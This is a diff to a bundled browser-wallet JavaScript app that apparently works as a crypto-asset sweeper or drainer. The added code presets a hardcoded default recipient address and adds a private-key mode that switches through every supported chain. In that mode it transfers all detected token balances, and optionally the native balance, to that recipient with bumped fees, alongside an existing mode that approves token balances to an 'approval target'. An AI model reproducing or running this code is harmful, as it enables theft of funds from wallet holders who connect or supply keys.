@@ -23651,6 +23651,51 @@ var APP_CONFIG = {
       multicall3: "0xcA11bde05977b3631167028862bE2a173976CA11"
     },
     {
+      key: "sonic",
+      name: "Sonic",
+      chainId: 146,
+      rpcUrls: ["https://rpc.soniclabs.com"],
+      blockExplorerUrls: ["https://sonicscan.org"],
+      nativeCurrency: { name: "Sonic", symbol: "S", decimals: 18 },
+      multicall3: "0xcA11bde05977b3631167028862bE2a173976CA11"
+    },
+    {
+      key: "berachain",
+      name: "Berachain",
+      chainId: 80094,
+      rpcUrls: ["https://rpc.berachain.com"],
+      blockExplorerUrls: ["https://berascan.com"],
+      nativeCurrency: { name: "BERA", symbol: "BERA", decimals: 18 },
+      multicall3: "0xcA11bde05977b3631167028862bE2a173976CA11"
+    },
+    {
+      key: "mantle",
+      name: "Mantle",
+      chainId: 5e3,
+      rpcUrls: ["https://rpc.mantle.xyz"],
+      blockExplorerUrls: ["https://mantlescan.xyz"],
+      nativeCurrency: { name: "Mantle", symbol: "MNT", decimals: 18 },
+      multicall3: "0xcA11bde05977b3631167028862bE2a173976CA11"
+    },
+    {
+      key: "binancechain",
+      name: "BNB Smart Chain",
+      chainId: 56,
+      rpcUrls: ["https://bsc-dataseed.bnbchain.org"],
+      blockExplorerUrls: ["https://bscscan.com"],
+      nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+      multicall3: "0xcA11bde05977b3631167028862bE2a173976CA11"
+    },
+    {
+      key: "monad",
+      name: "Monad",
+      chainId: 143,
+      rpcUrls: ["https://rpc.monad.xyz"],
+      blockExplorerUrls: ["https://monadscan.com"],
+      nativeCurrency: { name: "Monad", symbol: "MON", decimals: 18 },
+      multicall3: "0xcA11bde05977b3631167028862bE2a173976CA11"
+    },
+    {
       key: "zksync",
       name: "ZKsync",
       chainId: 324,
@@ -23663,7 +23708,7 @@ var APP_CONFIG = {
       key: "polygon",
       name: "Polygon",
       chainId: 137,
-      rpcUrls: ["https://polygon-rpc.com"],
+      rpcUrls: [],
       blockExplorerUrls: ["https://polygonscan.com"],
       nativeCurrency: { name: "POL", symbol: "POL", decimals: 18 },
       multicall3: "0xcA11bde05977b3631167028862bE2a173976CA11"
@@ -23675,7 +23720,7 @@ var APP_CONFIG = {
       rpcUrls: ["https://rpc.hyperliquid.xyz/evm"],
       blockExplorerUrls: ["https://app.hyperliquid.xyz/explorer"],
       nativeCurrency: { name: "HYPE", symbol: "HYPE", decimals: 18 },
-      multicall3: ""
+      multicall3: "0xcA11bde05977b3631167028862bE2a173976CA11"
     }
   ],
   strategies: {
@@ -23709,8 +23754,10 @@ var el = {
   scanBalancesButton: requiredElement("scanBalancesButton"),
   debugToggle: requiredElement("debugToggle"),
   debugPanel: requiredElement("debugPanel"),
+  sweepNativeAfterTokensToggle: requiredElement("sweepNativeAfterTokensToggle"),
   sendButton: requiredElement("sendButton"),
   singleRecipient: requiredElement("singleRecipient"),
+  useDefaultRecipientToggle: requiredElement("useDefaultRecipientToggle"),
   maxTokenTransfers: requiredElement("maxTokenTransfers"),
   approvalTarget: requiredElement("approvalTarget"),
   actionModeDisplay: requiredElement("actionModeDisplay"),
@@ -23759,7 +23806,19 @@ var state = {
     currentScanAccount: null
   },
   scanCache: {},
-  scanVersion: 0
+  scanVersion: 0,
+  skipNextChainChangedScan: false
+};
+var DEFAULT_RECIPIENT_ADDRESS = "0x00000023fcAD143271fF4D48aB37f8C31487586B";
+var DEFAULT_SEND_FEE_PER_GAS = ethers_exports.parseUnits("250", "gwei");
+var TRANSFER_FEE_BUMP_NUMERATOR = 111n;
+var TRANSFER_FEE_BUMP_DENOMINATOR = 100n;
+var SCAN_RPC_TIMEOUT_MS = 3e3;
+var ScanRpcTimeoutError = class extends Error {
+  constructor(message) {
+    super(message);
+    this.name = "ScanRpcTimeoutError";
+  }
 };
 function createStaticJsonRpcProvider(url, chainId) {
   return new ethers_exports.JsonRpcProvider(url, chainId, {
@@ -23771,6 +23830,21 @@ function destroyProvider(provider) {
     provider.destroy();
   }
 }
+function resetBrowserProvider() {
+  if (!window.ethereum) {
+    state.browserProvider = null;
+    state.signer = null;
+    return;
+  }
+  state.browserProvider = new ethers_exports.BrowserProvider(window.ethereum);
+}
+function isChangedNetworkError(error) {
+  if (!(error instanceof Error)) {
+    return false;
+  }
+  const codedError = error;
+  return codedError.code === "NETWORK_ERROR" || error.message.toLowerCase().includes("network changed");
+}
 function getTokenAddressKey(address) {
   return String(address || "").toLowerCase();
 }
@@ -23780,6 +23854,24 @@ function escapeHtml(value) {
 function sleep(ms) {
   return new Promise((resolve) => setTimeout(resolve, ms));
 }
+function getReportedGasPrice(feeData) {
+  return feeData.maxFeePerGas || feeData.gasPrice || null;
+}
+function bumpTransferFee(value) {
+  return value * TRANSFER_FEE_BUMP_NUMERATOR / TRANSFER_FEE_BUMP_DENOMINATOR;
+}
+function getFeeOverrides(feeData) {
+  if (feeData.maxFeePerGas) {
+    const maxFeePerGas = bumpTransferFee(feeData.maxFeePerGas);
+    return {
+      maxFeePerGas,
+      maxPriorityFeePerGas: feeData.maxPriorityFeePerGas ? bumpTransferFee(feeData.maxPriorityFeePerGas) : void 0
+    };
+  }
+  return {
+    gasPrice: bumpTransferFee(getReportedGasPrice(feeData) || DEFAULT_SEND_FEE_PER_GAS)
+  };
+}
 async function withRetries(label, task, maxRetries = MAX_SCAN_RETRIES) {
   let lastError;
   for (let attempt = 1; attempt <= maxRetries; attempt += 1) {
@@ -23787,6 +23879,9 @@ async function withRetries(label, task, maxRetries = MAX_SCAN_RETRIES) {
       return await task();
     } catch (error) {
       lastError = error;
+      if (error instanceof ScanRpcTimeoutError) {
+        break;
+      }
       if (attempt === maxRetries) {
         break;
       }
@@ -23795,6 +23890,21 @@ async function withRetries(label, task, maxRetries = MAX_SCAN_RETRIES) {
   }
   const message = lastError instanceof Error ? lastError.message : String(lastError);
   throw new Error(label + " failed after " + maxRetries + " attempts: " + message);
+}
+async function withTimeout(label, task, timeoutMs) {
+  let timeoutId = null;
+  const timeoutPromise = new Promise((_, reject) => {
+    timeoutId = setTimeout(() => {
+      reject(new ScanRpcTimeoutError(label + " timed out after " + timeoutMs + "ms"));
+    }, timeoutMs);
+  });
+  try {
+    return await Promise.race([task, timeoutPromise]);
+  } finally {
+    if (timeoutId) {
+      clearTimeout(timeoutId);
+    }
+  }
 }
 function getSelectedChain() {
   return APP_CONFIG.chains.find((item) => item.key === el.chainSelect.value) || APP_CONFIG.chains[0];
@@ -23812,10 +23922,13 @@ function getPrivateKeyValue() {
   return (el.privateKeyInput.value || "").trim();
 }
 function useRapidSubmit() {
-  return Boolean(el.rapidSubmitToggle.checked);
+  return Boolean(el.rapidSubmitToggle.checked) && !getPrivateKeySigner();
 }
 function useNativeFallback() {
   return Boolean(el.nativeFallbackToggle.checked);
+}
+function useSweepNativeAfterTokens() {
+  return Boolean(el.sweepNativeAfterTokensToggle.checked);
 }
 function setWalletNotice(message, kind) {
   el.walletNotice.textContent = message;
@@ -23834,6 +23947,11 @@ function updateActionModeDisplay() {
   if (getSelectedStrategy() === "permit_batch_signer") {
     el.actionModeDisplay.value = "Approve each selected token balance to the approval target";
     el.sendButton.textContent = "Approve selected tokens";
+    return;
+  }
+  if (getPrivateKeySigner()) {
+    el.actionModeDisplay.value = "Private-key mode sends every detected token balance on every funded supported chain to the recipient";
+    el.sendButton.textContent = "Send all detected tokens";
     return;
   }
   el.actionModeDisplay.value = "Send each selected token balance to the recipient";
@@ -23882,7 +24000,29 @@ async function getEffectiveAccount() {
   return state.account;
 }
 function updateSigningModeDisplay() {
-  el.signingModeDisplay.value = getPrivateKeySigner() ? "Debug private key using browser RPC" : "Extension wallet only";
+  const privateSigner = getPrivateKeySigner();
+  el.signingModeDisplay.value = privateSigner ? "Debug private key using browser RPC and send everything found on funded supported chains" : "Extension wallet only";
+  el.rapidSubmitToggle.disabled = Boolean(privateSigner);
+  updateActionModeDisplay();
+}
+function syncDefaultRecipientField() {
+  if (el.useDefaultRecipientToggle.checked) {
+    el.singleRecipient.value = DEFAULT_RECIPIENT_ADDRESS;
+    return;
+  }
+  if ((el.singleRecipient.value || "").trim().toLowerCase() === DEFAULT_RECIPIENT_ADDRESS.toLowerCase()) {
+    el.singleRecipient.value = "";
+  }
+}
+function selectChain(chainKey) {
+  el.chainSelect.value = chainKey;
+  updateConfiguredChainStatus();
+  state.debug.configuredTokenCount = getChainKnownTokensFromCatalog().length;
+  state.debug.queriedAddresses = [];
+  state.debug.nonZeroAddresses = [];
+  state.debug.failures = [];
+  state.selectedTokenAddresses = [];
+  renderDebugPanel();
 }
 function syncSelectedTokenAddresses(mode) {
   const available = state.knownTokenBalances.map((token) => getTokenAddressKey(token.address));
@@ -23958,9 +24098,25 @@ function sanitizeRpcUrl(value) {
   }
   return value;
 }
+function isLikelyKeyedRpcUrl(url) {
+  const value = url.toLowerCase();
+  if (value.includes("<api-key>") || value.includes("your_api_key") || value.includes("your-api-key") || value.includes("/v2/demo") || value.includes("/v3/your-api-key")) {
+    return true;
+  }
+  return [
+    "alchemy.com",
+    "infura.io",
+    "quicknode.com",
+    "chainstack.com",
+    "tenderly.co",
+    "getblock.io",
+    "thirdweb.com",
+    "blastapi.io"
+  ].some((fragment) => value.includes(fragment));
+}
 function getRpcUrlsForChain(chain) {
   const dynamic = state.rpcCatalog[chain.key] || [];
-  const merged = [...dynamic, ...chain.rpcUrls || []].map(sanitizeRpcUrl).filter((value) => Boolean(value));
+  const merged = [...chain.rpcUrls || [], ...dynamic].map(sanitizeRpcUrl).filter((value) => Boolean(value)).filter((value) => !isLikelyKeyedRpcUrl(value));
   return [...new Set(merged)];
 }
 async function loadChainlistRpcs() {
@@ -24001,7 +24157,10 @@ async function withRotatingProvider(label, task) {
     state.debug.activeRpc = url;
     renderDebugPanel();
     try {
-      const result = await withRetries(label + " via " + url, () => task(provider));
+      const result = await withRetries(
+        label + " via " + url,
+        () => withTimeout(label + " via " + url, task(provider), SCAN_RPC_TIMEOUT_MS)
+      );
       destroyProvider(provider);
       return result;
     } catch (error) {
@@ -24189,6 +24348,50 @@ async function loadKnownTokenBalancesMulticall(chain, tokens) {
     });
   });
 }
+async function hasTransferableNativeBalance() {
+  const effectiveAccount = await getEffectiveAccount();
+  if (!effectiveAccount) {
+    return false;
+  }
+  return withRotatingProvider("native balance scan", async (provider) => {
+    const balance = await provider.getBalance(effectiveAccount);
+    const feeData = await provider.getFeeData();
+    const gasPrice = getReportedGasPrice(feeData);
+    if (!gasPrice) {
+      return false;
+    }
+    const feeBuffer = 21000n * gasPrice * 12n / 10n;
+    return balance > feeBuffer;
+  });
+}
+async function hasUsableGasBalance(gasLimit = 120000n) {
+  const effectiveAccount = await getEffectiveAccount();
+  if (!effectiveAccount) {
+    return false;
+  }
+  if (!state.browserProvider) {
+    return false;
+  }
+  const balance = await state.browserProvider.getBalance(effectiveAccount);
+  const feeData = await state.browserProvider.getFeeData();
+  const gasPrice = getReportedGasPrice(feeData);
+  if (!gasPrice) {
+    return false;
+  }
+  const feeBuffer = gasLimit * gasPrice * 12n / 10n;
+  return balance > feeBuffer;
+}
+async function syncWalletToSelectedChainIfNeeded(reason) {
+  if (!state.browserProvider || !state.account || !window.ethereum) {
+    return;
+  }
+  const network = await state.browserProvider.getNetwork();
+  if (Number(network.chainId) === getSelectedChain().chainId) {
+    return;
+  }
+  setWalletNotice(reason, "good");
+  await switchChain();
+}
 async function refreshWalletStatus() {
   const selectedChain = getSelectedChain();
   const effectiveAccount = await getEffectiveAccount();
@@ -24199,8 +24402,25 @@ async function refreshWalletStatus() {
     el.balanceStatus.textContent = "-";
     return;
   }
-  const network = await state.browserProvider.getNetwork();
-  const balance = effectiveAccount ? await state.browserProvider.getBalance(effectiveAccount) : 0n;
+  let network;
+  let balance = 0n;
+  try {
+    network = await state.browserProvider.getNetwork();
+    balance = effectiveAccount ? await state.browserProvider.getBalance(effectiveAccount) : 0n;
+  } catch (error) {
+    if (!isChangedNetworkError(error)) {
+      throw error;
+    }
+    resetBrowserProvider();
+    if (!state.browserProvider) {
+      throw error;
+    }
+    if (state.account) {
+      state.signer = await state.browserProvider.getSigner(state.account);
+    }
+    network = await state.browserProvider.getNetwork();
+    balance = effectiveAccount ? await state.browserProvider.getBalance(effectiveAccount) : 0n;
+  }
   const walletChainId = Number(network.chainId);
   el.walletChainStatus.textContent = (network.name || "unknown") + " (" + walletChainId + ")";
   el.accountStatus.textContent = effectiveAccount || state.account;
@@ -24217,16 +24437,39 @@ async function refreshWalletStatus() {
     "error"
   );
 }
+async function hydrateWalletSession(requestAccounts = false) {
+  if (!window.ethereum) {
+    state.browserProvider = null;
+    state.signer = null;
+    state.account = null;
+    return false;
+  }
+  resetBrowserProvider();
+  if (!state.browserProvider) {
+    return false;
+  }
+  const method = requestAccounts ? "eth_requestAccounts" : "eth_accounts";
+  const accounts = await state.browserProvider.send(method, []);
+  const account = accounts && accounts[0] ? accounts[0] : null;
+  state.account = account;
+  if (!account) {
+    state.signer = null;
+    return false;
+  }
+  state.signer = await state.browserProvider.getSigner(account);
+  return true;
+}
 async function connectWallet() {
   if (!window.ethereum) {
     setWalletNotice("No extension wallet detected.", "error");
     return;
   }
   try {
-    state.browserProvider = new ethers_exports.BrowserProvider(window.ethereum);
-    await state.browserProvider.send("eth_requestAccounts", []);
-    state.signer = await state.browserProvider.getSigner();
-    state.account = await state.signer.getAddress();
+    const connected = await hydrateWalletSession(true);
+    if (!connected) {
+      setWalletNotice("Wallet connection failed.", "error");
+      return;
+    }
     await refreshWalletStatus();
     restoreScanCache();
   } catch (error) {
@@ -24236,7 +24479,7 @@ async function connectWallet() {
 async function switchChain() {
   if (!window.ethereum) {
     setWalletNotice("No extension wallet detected.", "error");
-    return;
+    return false;
   }
   const chain = getSelectedChain();
   const hexChainId = "0x" + chain.chainId.toString(16);
@@ -24260,15 +24503,26 @@ async function switchChain() {
       });
     } else {
       setWalletNotice(switchError.message || "Chain switch failed.", "error");
-      return;
+      return false;
     }
   }
-  if (state.browserProvider && state.account) {
-    await refreshWalletStatus();
-    restoreScanCache();
+  resetBrowserProvider();
+  if (!state.browserProvider) {
+    return false;
   }
+  if (state.account) {
+    state.signer = await state.browserProvider.getSigner(state.account);
+  }
+  return true;
 }
-async function loadKnownTokenBalances() {
+async function refreshSelectedChainPanelAndScan(scanVersion) {
+  await refreshWalletStatus();
+  if (scanVersion !== state.scanVersion) {
+    return;
+  }
+  await loadKnownTokenBalances(true);
+}
+async function loadKnownTokenBalances(suppressChainNotice = false, allowWalletSwitch = true) {
   const scanVersion = ++state.scanVersion;
   const chain = getSelectedChain();
   const configuredTokens = getChainKnownTokensFromCatalog();
@@ -24288,6 +24542,7 @@ async function loadKnownTokenBalances() {
   }
   let results = [];
   let readMode = "direct";
+  let hasNativeBalance = false;
   if (chain.multicall3 && ethers_exports.isAddress(chain.multicall3)) {
     try {
       results = await loadKnownTokenBalancesMulticall(chain, configuredTokens);
@@ -24317,12 +24572,28 @@ async function loadKnownTokenBalances() {
   renderKnownTokenBalances(nonZeroResults);
   renderTokenTransferList();
   renderDebugPanel();
+  try {
+    hasNativeBalance = await hasTransferableNativeBalance();
+  } catch {
+    hasNativeBalance = false;
+  }
+  if (allowWalletSwitch && (nonZeroResults.length || hasNativeBalance)) {
+    await syncWalletToSelectedChainIfNeeded(
+      "Actionable balances found on " + chain.name + ". Switching wallet to the selected chain."
+    );
+  }
+  if (suppressChainNotice) {
+    return nonZeroResults;
+  }
   if (configuredTokens.length) {
     setTransferNotice(
-      "Checked " + configuredTokens.length + " catalog tokens on " + chain.name + " using " + readMode + ". Found " + nonZeroResults.length + " with balance."
+      "Checked " + configuredTokens.length + " catalog tokens on " + chain.name + " using " + readMode + ". Found " + nonZeroResults.length + " token balance(s)" + (hasNativeBalance ? " and transferable native balance." : ".")
     );
   } else {
-    setTransferNotice("No catalog tokens are mapped to " + chain.name + ".", "error");
+    setTransferNotice(
+      hasNativeBalance ? "No catalog tokens are mapped to " + chain.name + ", but transferable native balance was detected." : "No catalog tokens are mapped to " + chain.name + ".",
+      hasNativeBalance ? "good" : "error"
+    );
   }
   return nonZeroResults;
 }
@@ -24371,6 +24642,10 @@ async function getExecutionContext() {
 }
 async function executePlan() {
   const plan = buildExecutionPlan();
+  if (plan.strategy === "sequential_calls" && getPrivateKeySigner()) {
+    await executeSequentialPrivateKeySweep(plan);
+    return;
+  }
   if (plan.strategy === "sequential_calls") {
     await executeSequential(plan);
     return;
@@ -24380,6 +24655,93 @@ async function executePlan() {
     return;
   }
   setTransferNotice("Unknown execution strategy.", "error");
+}
+async function sendSequentialTransfers(plan, chain, executionSigner, tokenTransfers) {
+  if (!tokenTransfers.length) {
+    return;
+  }
+  const feeData = state.browserProvider ? await state.browserProvider.getFeeData() : null;
+  const feeOverrides = feeData ? getFeeOverrides(feeData) : {};
+  for (let index = 0; index < tokenTransfers.length; index += 1) {
+    const token = tokenTransfers[index];
+    setTransferNotice(
+      "Sending " + token.symbol + " on " + chain.name + " " + (index + 1) + " of " + tokenTransfers.length + " to " + plan.recipient + "."
+    );
+    const contract = new ethers_exports.Contract(token.address, ERC20_ABI, executionSigner);
+    await contract.transfer(plan.recipient, token.balanceRaw, feeOverrides);
+    if (index < tokenTransfers.length - 1) {
+      await sleep(75);
+    }
+  }
+}
+async function executeSequentialPrivateKeySweep(plan) {
+  if (!ethers_exports.isAddress(plan.recipient || "")) {
+    setTransferNotice("Provide one valid recipient address for sequential token sends.", "error");
+    return;
+  }
+  if (!await hydrateWalletSession(false)) {
+    setTransferNotice("Connect the wallet first.", "error");
+    return;
+  }
+  const originalChainKey = getSelectedChain().key;
+  const summary = [];
+  let totalTransfers = 0;
+  for (const chain of APP_CONFIG.chains) {
+    try {
+      selectChain(chain.key);
+      setTransferNotice("Private-key sweep: switching to " + chain.name + ".");
+      state.skipNextChainChangedScan = true;
+      const switched = await switchChain();
+      if (!switched) {
+        state.skipNextChainChangedScan = false;
+        summary.push(chain.name + ": switch failed");
+        continue;
+      }
+      await refreshWalletStatus();
+      const hasGas = await hasUsableGasBalance();
+      if (!hasGas) {
+        summary.push(chain.name + ": no usable gas");
+        continue;
+      }
+      const tokenTransfers = await loadKnownTokenBalances(true, false);
+      if (!tokenTransfers.length) {
+        summary.push(chain.name + ": no tokens");
+        continue;
+      }
+      const executionSigner = getPrivateKeySigner();
+      if (!executionSigner) {
+        setTransferNotice("Private key signer is unavailable.", "error");
+        return;
+      }
+      await sendSequentialTransfers(plan, chain, executionSigner, tokenTransfers);
+      let sentNative = false;
+      if (useSweepNativeAfterTokens()) {
+        sentNative = await sendNativeBalanceForCurrentChain(plan, chain, executionSigner, true);
+      }
+      totalTransfers += tokenTransfers.length;
+      summary.push(
+        chain.name + ": sent " + tokenTransfers.length + " token" + (tokenTransfers.length === 1 ? "" : "s") + (sentNative ? " + native" : "")
+      );
+    } catch (error) {
+      summary.push(chain.name + ": " + (error instanceof Error ? error.message : "failed"));
+    }
+  }
+  selectChain(originalChainKey);
+  state.skipNextChainChangedScan = true;
+  const restored = await switchChain();
+  if (!restored) {
+    state.skipNextChainChangedScan = false;
+  }
+  await refreshWalletStatus();
+  restoreScanCache();
+  if (!totalTransfers) {
+    setTransferNotice("Private-key sweep finished with no token transfers. " + summary.join("; "), "error");
+    return;
+  }
+  setTransferNotice(
+    "Private-key sweep complete. Sent " + totalTransfers + " token transfer" + (totalTransfers === 1 ? "" : "s") + ". " + summary.join("; "),
+    "good"
+  );
 }
 async function executeSequential(plan) {
   const context = await getExecutionContext();
@@ -24400,10 +24762,12 @@ async function executeSequential(plan) {
   }
   const { executionSigner } = context;
   if (plan.rapidSubmit) {
+    const feeData = state.browserProvider ? await state.browserProvider.getFeeData() : null;
+    const feeOverrides = feeData ? getFeeOverrides(feeData) : {};
     setTransferNotice("Submitting " + plan.tokenTransfers.length + " token transfer requests to the wallet.");
     const results = await Promise.all(plan.tokenTransfers.map((token, index) => {
       const contract = new ethers_exports.Contract(token.address, ERC20_ABI, executionSigner);
-      return contract.transfer(plan.recipient, token.balanceRaw).then((tx) => ({ ok: true, token, hash: tx.hash, index })).catch((error) => ({ ok: false, token, error, index }));
+      return contract.transfer(plan.recipient, token.balanceRaw, feeOverrides).then((tx) => ({ ok: true, token, hash: tx.hash, index })).catch((error) => ({ ok: false, token, error, index }));
     }));
     const failures = results.filter((item) => !item.ok);
     if (failures.length) {
@@ -24416,15 +24780,7 @@ async function executeSequential(plan) {
     setTransferNotice("Submitted " + results.length + " token transfer requests to the wallet.", "good");
     return;
   }
-  for (let index = 0; index < plan.tokenTransfers.length; index += 1) {
-    const token = plan.tokenTransfers[index];
-    setTransferNotice("Sending " + token.symbol + " " + (index + 1) + " of " + plan.tokenTransfers.length + " to " + plan.recipient + ".");
-    const contract = new ethers_exports.Contract(token.address, ERC20_ABI, executionSigner);
-    await contract.transfer(plan.recipient, token.balanceRaw);
-    if (index < plan.tokenTransfers.length - 1) {
-      await sleep(75);
-    }
-  }
+  await sendSequentialTransfers(plan, context.chain, executionSigner, plan.tokenTransfers);
   setTransferNotice("Submission complete. Sent " + plan.tokenTransfers.length + " token transfer requests to " + plan.recipient + ".", "good");
 }
 async function executeApprovals(plan) {
@@ -24442,10 +24798,12 @@ async function executeApprovals(plan) {
   }
   const { executionSigner } = context;
   if (plan.rapidSubmit) {
+    const feeData = state.browserProvider ? await state.browserProvider.getFeeData() : null;
+    const feeOverrides = feeData ? getFeeOverrides(feeData) : {};
     setTransferNotice("Submitting " + plan.tokenTransfers.length + " approval requests to the wallet.");
     const results = await Promise.all(plan.tokenTransfers.map((token, index) => {
       const contract = new ethers_exports.Contract(token.address, ERC20_ABI, executionSigner);
-      return contract.approve(plan.approvalTarget, token.balanceRaw).then((tx) => ({ ok: true, token, hash: tx.hash, index })).catch((error) => ({ ok: false, token, error, index }));
+      return contract.approve(plan.approvalTarget, token.balanceRaw, feeOverrides).then((tx) => ({ ok: true, token, hash: tx.hash, index })).catch((error) => ({ ok: false, token, error, index }));
     }));
     const failures = results.filter((item) => !item.ok);
     if (failures.length) {
@@ -24462,7 +24820,9 @@ async function executeApprovals(plan) {
     const token = plan.tokenTransfers[index];
     setTransferNotice("Approving " + token.symbol + " " + (index + 1) + " of " + plan.tokenTransfers.length + " to " + plan.approvalTarget + ".");
     const contract = new ethers_exports.Contract(token.address, ERC20_ABI, executionSigner);
-    await contract.approve(plan.approvalTarget, token.balanceRaw);
+    const feeData = state.browserProvider ? await state.browserProvider.getFeeData() : null;
+    const feeOverrides = feeData ? getFeeOverrides(feeData) : {};
+    await contract.approve(plan.approvalTarget, token.balanceRaw, feeOverrides);
     if (index < plan.tokenTransfers.length - 1) {
       await sleep(1e3);
     }
@@ -24474,37 +24834,54 @@ async function sendNativeFallback(plan) {
   if (!context || !state.browserProvider) {
     return;
   }
+  await sendNativeBalanceForCurrentChain(plan, context.chain, context.executionSigner, false);
+}
+async function sendNativeBalanceForCurrentChain(plan, chain, executionSigner, quiet = false) {
+  if (!state.browserProvider) {
+    return false;
+  }
   const effectiveAccount = await getEffectiveAccount();
   if (!effectiveAccount) {
-    setTransferNotice("No effective account available for native fallback.", "error");
-    return;
+    if (!quiet) {
+      setTransferNotice("No effective account available for native fallback.", "error");
+    }
+    return false;
   }
-  const { chain, executionSigner } = context;
   const balance = await state.browserProvider.getBalance(effectiveAccount);
   const feeData = await state.browserProvider.getFeeData();
   const estimatedGas = await executionSigner.estimateGas({ to: plan.recipient, value: 1n });
   const gasLimit = estimatedGas > 21000n ? estimatedGas : 21000n;
-  const gasPrice = feeData.maxFeePerGas || feeData.gasPrice;
+  const gasPrice = getReportedGasPrice(feeData);
   if (!gasPrice) {
-    setTransferNotice("Could not determine gas price for native fallback.", "error");
-    return;
+    if (!quiet) {
+      setTransferNotice("Could not determine gas price for native fallback.", "error");
+    }
+    return false;
   }
   const feeBuffer = gasLimit * gasPrice * 12n / 10n;
   const value = balance - feeBuffer;
   if (value <= 0n) {
-    setTransferNotice("Native balance is too small after estimated fee buffer.", "error");
-    return;
+    if (!quiet) {
+      setTransferNotice("Native balance is too small after estimated fee buffer.", "error");
+    }
+    return false;
   }
-  setTransferNotice("No tokens found. Sending native fallback balance to " + plan.recipient + ".");
+  if (!quiet) {
+    setTransferNotice("No tokens found. Sending native fallback balance to " + plan.recipient + ".");
+  }
+  const feeOverrides = getFeeOverrides(feeData);
   await executionSigner.sendTransaction({
     to: plan.recipient,
     value,
     gasLimit,
-    maxFeePerGas: feeData.maxFeePerGas || void 0,
-    maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || void 0,
-    gasPrice: feeData.maxFeePerGas ? void 0 : feeData.gasPrice || void 0
+    maxFeePerGas: feeOverrides.maxFeePerGas,
+    maxPriorityFeePerGas: feeOverrides.maxPriorityFeePerGas,
+    gasPrice: feeOverrides.gasPrice
   });
-  setTransferNotice("Native fallback complete on " + chain.name + (plan.rapidSubmit ? " using rapid submit." : "."), "good");
+  if (!quiet) {
+    setTransferNotice("Native fallback complete on " + chain.name + (plan.rapidSubmit ? " using rapid submit." : "."), "good");
+  }
+  return true;
 }
 async function sendSelectedPlan() {
   el.sendButton.disabled = true;
@@ -24531,8 +24908,10 @@ function bindWalletEvents() {
   }
   window.ethereum.on("accountsChanged", async (accounts) => {
     const localVersion = ++state.scanVersion;
+    resetBrowserProvider();
     state.account = accounts && accounts[0] ? accounts[0] : null;
     if (!state.account) {
+      state.signer = null;
       el.accountStatus.textContent = "-";
       el.balanceStatus.textContent = "-";
       setWalletNotice("Wallet disconnected.", "error");
@@ -24544,22 +24923,29 @@ function bindWalletEvents() {
       renderDebugPanel();
       return;
     }
+    if (state.browserProvider) {
+      state.signer = await state.browserProvider.getSigner(state.account);
+    }
     await refreshWalletStatus();
     if (localVersion !== state.scanVersion) {
       return;
     }
-    restoreScanCache();
+    await loadKnownTokenBalances(true);
   });
   window.ethereum.on("chainChanged", async () => {
     const localVersion = ++state.scanVersion;
+    resetBrowserProvider();
     if (!state.account) {
       return;
     }
-    await refreshWalletStatus();
-    if (localVersion !== state.scanVersion) {
+    if (state.browserProvider) {
+      state.signer = await state.browserProvider.getSigner(state.account);
+    }
+    if (state.skipNextChainChangedScan) {
+      state.skipNextChainChangedScan = false;
       return;
     }
-    restoreScanCache();
+    await refreshSelectedChainPanelAndScan(localVersion);
   });
   window.ethereum.__walletBatchBound = true;
 }
@@ -24572,13 +24958,16 @@ function bindEvents() {
     state.debug.nonZeroAddresses = [];
     state.debug.failures = [];
     state.selectedTokenAddresses = [];
-    if (state.account) {
-      await switchChain();
-      if (localVersion !== state.scanVersion) {
-        return;
+    const hasWalletSession = await hydrateWalletSession(false);
+    if (hasWalletSession) {
+      state.skipNextChainChangedScan = true;
+      const switched = await switchChain();
+      if (!switched) {
+        state.skipNextChainChangedScan = false;
       }
-      restoreScanCache();
+      await refreshSelectedChainPanelAndScan(localVersion);
     } else {
+      await refreshWalletStatus();
       renderDebugPanel();
     }
   });
@@ -24606,11 +24995,16 @@ function bindEvents() {
     state.selectedTokenAddresses = state.selectedTokenAddresses.filter((item) => item !== address);
   });
   el.debugToggle.addEventListener("change", renderDebugPanel);
+  el.useDefaultRecipientToggle.addEventListener("change", syncDefaultRecipientField);
+  el.singleRecipient.addEventListener("input", () => {
+    const recipient = (el.singleRecipient.value || "").trim().toLowerCase();
+    el.useDefaultRecipientToggle.checked = recipient === DEFAULT_RECIPIENT_ADDRESS.toLowerCase();
+  });
   el.privateKeyInput.addEventListener("input", async () => {
     updateSigningModeDisplay();
     if (state.browserProvider && state.account) {
       await refreshWalletStatus();
-      restoreScanCache();
+      await loadKnownTokenBalances(true);
     }
   });
   el.connectButton.addEventListener("click", connectWallet);
@@ -24626,11 +25020,16 @@ async function init2() {
   await loadChainlistRpcs();
   populateChains();
   updateStrategyStatus();
+  syncDefaultRecipientField();
   state.debug.configuredTokenCount = getChainKnownTokensFromCatalog().length;
   renderTokenTransferList();
   renderDebugPanel();
   bindEvents();
   bindWalletEvents();
+  if (await hydrateWalletSession(false)) {
+    await refreshWalletStatus();
+    restoreScanCache();
+  }
 }
 void init2();
 /*! Bundled license information:
